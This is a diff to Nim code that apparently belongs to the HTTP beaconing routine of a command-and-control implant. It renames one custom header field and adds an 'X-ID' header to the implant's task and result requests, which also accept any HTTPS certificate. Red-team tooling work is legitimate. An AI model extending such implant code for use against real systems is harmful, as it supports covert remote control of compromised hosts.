@@ -22,7 +22,8 @@ type
         taskPath* : string
         resultPath* : string
         userAgent* : string
-        customHeaderOne*: string
+        xHeader*: string
+        xID*: string
         cryptKey* : string
 
 # HTTP request function
@@ -45,12 +46,14 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
                 headers = @[
                         Header(key: "X-Identifier", value: li.id),
                         Header(key: "User-Agent", value: li.userAgent),
-                        Header(key: "X-Header", value: li.customHeaderOne)
+                        Header(key: "X-Header", value: li.xHeader),
+                        Header(key: "X-ID", value: li.xID)
                     ]
             else:
                 headers = @[
                         Header(key: "User-Agent", value: li.userAgent),
-                        Header(key: "X-Header", value: li.customHeaderOne)
+                        Header(key: "X-Header", value: li.xHeader),
+                        Header(key: "X-ID", value: li.xID)
                     ]
 
             let req = Request(
@@ -70,7 +73,8 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
                 headers: @[
                     Header(key: "X-Identifier", value: li.id),
                     Header(key: "User-Agent", value: li.userAgent),
-                    Header(key: "X-Header", value: li.customHeaderOne),
+                    Header(key: "X-Header", value: li.xHeader),
+                    Header(key: "X-ID", value: li.xID),
                     Header(key: "Content-Type", value: "application/json")
                     ],
                 allowAnyHttpsCertificate: true,
